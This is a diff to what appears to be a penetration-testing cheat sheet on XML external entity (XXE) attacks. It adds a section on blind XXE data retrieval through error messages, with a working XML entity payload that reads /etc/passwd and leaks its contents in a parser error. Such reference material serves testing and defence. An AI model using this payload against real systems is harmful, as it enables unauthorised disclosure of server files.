@@ -76,6 +76,19 @@
 
 Note: This technique might not work with multiline files.
 
+### Via error messages <a href="#exploiting-blind-xxe-to-retrieve-data-via-error-messages" id="exploiting-blind-xxe-to-retrieve-data-via-error-messages"></a>
+
+Trigger an XML parsing error message with the file contents.&#x20;
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+Note: This works if you notice an error in the response when detecting with OAST (e.g., the reflected URL entered)
+
 ## Hidden attack surface
 
 * **First case** - Requests that contain data in XML format
